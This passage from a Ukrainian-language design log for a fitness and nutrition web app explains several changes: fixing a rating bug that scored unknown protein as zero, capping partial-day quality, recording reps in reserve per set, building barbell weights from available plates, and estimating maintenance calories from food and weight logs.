бере драбину. Нуль падає на найнижчу сходинку — 0.05. Тобто **«невідомо»
оцінювалось як «з'їв нуль білка»**.

Ціна виміряна, а не оцінена на око. День із калоріями в межах 2 % від
цілі:

| День | Якість |
|---|---|
| розібраний, білок у нормі | 1.000 |
| приблизний, білок невідомий — **було** | 0.573 |

Плюс `elo_try_clean_day` вимагає якості ≥ `cleanThreshold` (0.9) у кожній
із чотирьох категорій, тож такий день не міг стати чистим ніколи: мінус
бонус дня і розірваний чистий тиждень. А застосунок показував людині тост
«білкова частина рейтингу за цей день не рахується». Вона рахувалась — як
провалена.

**Найдорожче тут не арифметика, а те, скільки часу воно жило непоміченим.**
Гілка «калорії беруть усю вагу при `pTarget = 0`» стояла на сервері від
етапу authoritative, і `countsProtein()` у `history-core.js` знав ту саму
різницю від першого дня. Два правильні механізми з обох боків — і жодного
дроту між ними: запис просто завжди заповнював поле, через яке гілка
ніколи не вмикалась. Помилка такого роду не падає й не логується.

### Що вирішено

Два окремі сигнали, кожен про одне:

1. **Білок невідомий** — `quickDay()` більше не пише `pTarget`. Наявна
   серверна гілка нарешті працює: калорії беруть усю вагу категорії.
2. **Запис приблизний** — `elo_facts` віддає прапорець `partial`, і
   `elo_action_delta` зрізає якість стелею `partialNutritionCap = 0.85`.

Самих калорій було б замало. Без стелі бездоганний приблизний день
коштував би рівно стільки ж, скільки розібраний по грамах, — і розбирати
їжу не було б сенсу взагалі. Рейтинг перестав би міряти те, що обіцяє.

Число 0.85 вибране не на око: `cleanThreshold` = 0.9, і стеля туди не
дотягує **за побудовою**. Отже «приблизний день ніколи не буває чистим» —
це наслідок одного числа, а не окремої заборони. Перелік заборон
розходиться з правилом на першій же правці; одне число — ні. Те саме
міркування, що в §1.1 AGENTS.md про структурний бар'єр замість чорного
списку.

Стеля зрізає лише верх: поганий приблизний день і без неї нижчий за 0.85,
тож карати його вдруге нема за що.

### Драбина після зміни

| День | Якість | Чистий |
|---|---|---|
| розібраний, білок у нормі | 1.000 | так |
| приблизний, будь-який | 0.850 | ні |
| приблизний, калорії +30 % | 0.150 | ні |
| день не записано | — | ні |

Дельта в ELO залежить ще й від рівня: тижневий бюджет множиться на
`elo_pace`, тож на першому рівні це 15 / 13 / 2, а ближче до стелі сезону
— близько 7 / 6 / 1. Від рівня не залежить саме **якість**, тому правило
й сформульоване в ній.

### Порядок викочування має значення

Сервер іде першим. Поки клієнт старий, він і далі пише `pTarget`, отже
`m = 0.573`, і стеля 0.85 не спрацьовує — накат нічого не міняє, доки не
поїде код. Навпаки було б гірше: клієнт без стелі на сервері дав би
приблизному дню повну вартість розібраного.

`openMealPenalty` у конфізі до рушія не дійшов узагалі — його читає лише
`tools/simelo.mjs`. Тобто незаписаний день не карається; його ціна — лише
ненарахований плюс. Ключ під наглядом `elo-config-sync.test.js` як
свідомо мертвий.

### Що стереже

- `tests/history-core.test.js` — «невідомий білок не стає нулем»:
  `quickDay` без білка не пише `pTarget`, із білком пише, повний день
  пише навіть із нулем (там нуль виміряний);
- `tests/elo-core.test.js` — «приблизний день харчування»: стеля
  застосовується, до `cleanThreshold` не дотягує, поганого дня не чіпає,
  приблизний дорожчий за незаписаний і дешевший за розібраний;
- `tests/elo-config-sync.test.js` — новий ключ мусить читатися з SQL,
  інакше збірка падає (INV-007);
- `db/live-schema.sql` — знімок звірений із базою по `md5(prosrc)`, а не
  «перезнятий про всяк випадок».

Відкат — `db/elo-partial-cap-rollback.sql`. Тіла функцій у ньому взяті з
самої міграції зі знятими доданими місцями, а не переписані з пам'яті:
відкат, написаний окремо, розходиться з міграцією на першій правці.

## 21. RIR підходу: чому порожнє поле лишається порожнім

Запас до відмови (RIR) до цього існував лише в ПЛАНІ вправи — одне число
на всі підходи. Тепер його можна вписати в кожен закритий підхід:
`done[i][k].q`, і далі в знімок сесії, `sessionLog[день].ex[].s[].q`.

### Рішення, яке визначає все інше

Вагу й повтори підхід успадковує від плану, коли їх не правили. **RIR —
ні.** Підхід, у якому число не ввели, лишається без нього.

Різниця не в акуратності, а в тому, що означає кожне з трьох чисел. Вага
з книги чесна: вона справді стоїть на штанзі, і підставити її — значить
записати факт. Повтори з плану — орієнтир, який видно на екрані, і саме
тому тоннаж підписаний «≈». А RIR із плану — це НАМІР: план каже
«зупинись за два», людина могла піти до відмови, і жодних даних про те,
що сталось, у застосунку немає.

Підставлений RIR виглядав би як справжні дані і зіпсував би рівно ту
аналітику, заради якої поле й з'явилось: середній RIR по вправі
дорівнював би плановому завжди, а «третій тиждень усі підходи на RIR 4 —
вага застара» не спрацював би ніколи. Тому `performedSets` не має
запасного значення для `q`, `setDoneSets` не дописує його новим підходам,
а `editSet` на порожнє поле ВИДАЛЯЄ число, а не повертає планове.

Ціна рішення: аналітика рахує лише ті підходи, де число є. Це правильна
ціна — «замало даних» чесніше за середнє з вигаданого.

### Стеля 5, і чому вона обрізає, а не відхиляє

`RepsCore.normRir` обрізає 9 до 5 (причина стелі — поруч із `RIR_MAX`:
вище пʼяти підхід перестає бути силовим і формула Еплі на ньому не
працює). Поле показує обрізане число одразу, бо мовчазне обрізання
людина помітила б лише в аналітиці через місяць.

`js/history-core.js` натомість значення поза межами просто НЕ ПИШЕ — як
уже робить із вагою (0–500) і повторами (1–200). Сховище не вірить тому,
хто пише, бо до нього приходить ще й імпорт резервної копії, правленої
руками.

### Дві дрібниці, які виявились під час роботи

**`flex-wrap` не стискає, а переносить.** Третє поле в рядку підходу
поїхало на власний рядок: із `flex-wrap: wrap` перенос спрацьовує
ПЕРШИМ, і стиснення вже не настає. Або перенос, або стиснення — разом
вони не працюють.

**Поле ваги різало «102,5» і до цього релізу.** 78px із падінгами по 10
лишали 58px на пʼять знаків шістнадцятим кеглем, яких треба 68. Видно це
було тільки на вазі з комою, тому й жило довго. Кегль на телефонах
чіпати не можна — нижче 16px iOS масштабує сторінку при фокусі й назад
не повертає, — тож вузько стає за рахунок падінгів і проміжків.

### Що з цього виходить

Записане число міняє два висновки, інакше це поле заради поля.

**Оцінка 1ПМ стає чесною.** Формули описують підхід, доведений до
відмови, а план сам каже зупинятись за одне-два до межі — тобто без RIR
оцінка систематично занижена, і тим сильніше, чим обережніше людина
тренується. `ExerciseCore.e1rmOf(kg, reps, rir)` додає запас до
повторень: 8 із запасом 2 — це 10 до відмови. Так само рахує
`periodization-core`, коли будує драбину від плану; два різні «до
відмови» в одному застосунку означали б, що графік прогресу й план
розходяться на рівному місці.

**Плато дістає причину.** `ProgressCore.rirStats` зводить запас по
вправах за 30 днів і ставить один із двох висновків:

- `light` — середній запас від 3,5. Вага застара: графік, який стоїть,
  стоїть саме через це, а не через плато;
- `hard` — більшість підходів на нулі. Тижнями поспіль це не героїзм, а
  рахунок, який приходить розвантаженням.

Поріг КІЛЬКОСТІ важливіший за поріг значення: висновок вимагає щонайменше
чотирьох підходів на двох різних тренуваннях. Два підходи з великим
запасом — це один поганий день, а не характеристика ваги.

Картка «Запас до відмови» в журналі ЗНИКАЄ, поки жодного числа не
вписано. Порожня таблиця з прочерками виглядає як зламана функція, а не
як запрошення; поле необовʼязкове навмисно, і той, хто його не веде, не
має отримувати докір у журналі.

### Що стереже

- `tests/rir-per-set.test.js` — q не успадковується від плану й від

## 22. Профіль залу: крок ваги перестав бути припущенням

Весь застосунок вважав, що найменша добавка до ваги — 2,5 кг. Це пара
млинців по 1,25. У залі, де таких млинців немає, найменша добавка — 5, а
то й 10 кг; на гантельному ряду з кроком 2 кг «+2,5» не існує в
принципі; у тренажера зі стеком по 5 — тим паче. Тобто вага, яку сайт
радив поставити, не завжди піддавалась встановленню.

`js/gym-core.js` тримає інвентар (`profile.gym`) і відповідає на три
питання: яку вагу реально зібрати, яка наступна вгору, який крок біля
цієї ваги.

### Порожній профіль мусить збігатися з учорашнім днем

Це вимога, а не ввічливість: людина, яка інвентар не вводила, не має
побачити інші числа, ніж бачила вчора. Тому порожній профіль дає рівно
старе правило — 2,5 кг від двадцяти і вище, 1 кг нижче, — і
`tools/verifygym.mjs` порівнює драбини «до» і «після» напряму.

Це ж правило досі жило в трьох копіях (`OneRM.PLATE_STEP`,
`periodization-core.stepFor`, `projection.stepForWeight` — остання з
чесним коментарем «дублюємо, бо periodization-core тут не
завантажується»). Четвертої копії не з'явилось: `gym-core` бере крок із
`OneRM.PLATE_STEP`.

### Млинці рахуються ПАРАМИ

На штангу вішають симетрично, отже «три млинці по 10» — це завжди або
два, або чотири. Пари прибирають цілий клас помилок вводу й удвічі
зменшують простір станів.

### Динамічне програмування, а не перебір

Комбінацій млинців — добуток `(пар + 1)` по номіналах: шість номіналів
по десять пар дають 1,7 мільйона варіантів і підвішений браузер.
Замість перебору — множина досяжних сум: вона обмежена стелею 500 кг і
кроком 0,25, тобто щонайбільше двома тисячами станів, скільки б млинців
у залі не лежало. Тест ганяє саме цей набір і вимагає відповіді швидше
ніж за півсекунди.

Побічний висновок, який видно лише на драбині: **101,25 кг зібрати
неможливо ніколи**. Пара найлегших млинців додає 2,5, отже всі збірні
ваги кратні 2,5 від грифа. Тест це фіксує, щоб ніхто потім не «полагодив»
округлення до найближчої чверті.

### Снаряд упізнається за назвою вправи

Назви в цьому застосунку описові й українські — «Жим штанги під нахилом
у Сміті», «Махи з гантелями сидячи», «Тяга верхнього блоку». Снаряд у
них названий прямо, і це найдешевший спосіб його знати, не змушуючи
людину розмічати сорок вправ руками. Коли назва мовчить — `other`, і
працює старе правило: вигадати снаряд гірше, ніж не знати його, бо
вигадка тихо змінить числа.

У регулярному виразі НЕМАЄ `\b`. У JS межа слова — ASCII, після
кириличної літери вона не спрацьовує, і «блоку» не збігалося з
`блок\b`. Рівно на цьому вже горіла міграція, яка чистила «Підводні» з
планів.

### `warmupSets` приймає функцію замість кроку

Другим аргументом тепер можна передати округлювач. Так ядро розминки
лишається без залежності на `GymCore`: воно округлює тим, що дали, а
знає про зал уже сторінка. Старий виклик із числом працює як працював.

### Що стереже

- `tests/gym-core.test.js` — штанга збирається лише з наявних пар,
  стеля не вигадується, гантельний ряд і стек мають свої кроки,
  порожній профіль поводиться як раніше, сміття в інвентарі не
  проходить, великий набір рахується миттєво;
- `tools/verifygym.mjs` — картка на «Моєму плані», типовий набір,
  збереження в профіль, і головне: у залі без дрібних млинців
  розминка 100 кг стає 40 · 60 · 80 замість 45 · 65 · 85.

## 23. Адаптивні витрати: підтримання перестало бути формулою

Формула Міффліна бере зріст, вагу, вік і коефіцієнт активності, обраний
один раз на онбордингу. Вона за визначенням не знає, що людина перейшла
з трьох тренувань на пʼять, почала ходити пішки або має обмін
повільніший за середній. Похибка на конкретній людині — сотні калорій, і
це не вада формули: вона описує СЕРЕДНЮ людину, якої в житті не буває.

Арифметика балансу натомість чесна:

```
підтримання = середнє спожите − (зміна ваги × 7700 / дні)
```

`js/tdee-core.js` рахує це по журналах їжі та зважувань.

### Де тут пастки й що з ними зроблено

| Пастка | Рішення |
|---|---|
| Вода, глікоген, сіль рухають вагу на ±1,5 кг незалежно від жиру | вікно не менше 14 днів, а зміна береться між СЕРЕДНІМИ за перший і останній тиждень, не між двома ранками |
| Пропущені дні харчування | потрібно щонайменше 70 % закритих днів у вікні; менше — результату немає, а не результат зі зіркою |
| Один день застілля | вікно 28 днів, коли даних вистачає: один день важить учетверо менше, ніж у тижневому |
| Людина не веде харчування | функція віддає null, картки немає, ціль рахується формулою — і жодного докору ніде |

### Смуга — не прикраса

Шум одного тижневого середнього прийнято за 0,4 кг (практична
конвенція). Різниця двох середніх має шум у корінь із двох разів
більший, а кожен кілограм похибки коштує 7700 ккал, поділених на
довжину проміжку. Тому на двох тижнях смуга виходить удвічі ширшою, ніж
на чотирьох. Це правда про дані, а не песимізм, і показувати одне число
без неї означало б удавати точність, якої немає.

### Масштабування по вазі — не дрібниця

`targetFor` кличуть не лише для «сьогодні»: `massForecast` підставляє в
нього ІНШУ вагу, щоб побачити, як зміняться витрати за пів року.
Виміряне число описує людину, яка важить `refKg` СЬОГОДНІ; перенести
його на 70 кг без поправки означало б прогнозувати схуднення, якого не
буде. Тому вимірювання дає РІВЕНЬ, а формула — форму залежності від
ваги: `tdee = виміряне × bmr(нова вага) / bmr(refKg)`.

### Рейтинг від цього не зсунувся

`elo_*` не рахує ціль сам: він читає `target`, збережений У ЗАПИСІ дня
(`mealLog[день].target`). Ціль, що діяла того дня, лишається в історії
назавжди, тож зміна способу її рахувати впливає лише на дні, закриті
після перемикання. Саме заради цього ціль і зберігається в записі —
див. заголовок `js/history-core.js`.

### `tdeeMode: null`, а не `'formula'`

`isMeaningful` у store.js вважає будь-яке непорожнє поле ознакою роботи
людини. Рядок `'formula'` за замовчуванням зробив би КОЖЕН чистий
браузер «непорожнім», і кожен вхід пропонував би «взяти дані з цього
браузера», де даних немає — рівно та пастка, що вже була з
`ratingAlgorithmVersion`. Вимкнений перемикач теж пишеться як null:
«вимкнув» і «не чіпав» — це одне й те саме.

Зловив це старий тест «порожній профіль мусить читатись як порожній».
Другий старий тест — регресія підлоги калорійності — зловив інше:
хелпер `sexOf(p)` повертає РЯДОК 'male'/'female', і в умові
`isFemale ? 1200 : 1500` обидва рядки істинні, тож чоловіки почали
отримувати жіночу підлогу 1200.

### Що стереже

  відома наперед (підтримання 2800, їжа 2500, рівно те падіння ваги, яке
  дає дефіцит 300 ккал); дірки в журналі; відсутність зважувань на
  краях; ширша смуга на коротшому вікні; ціль від виміряного і
  масштабування по вазі;
- `tools/verifytdee.mjs` — картка, перемикач, і головне: ціль однакова

  як було.
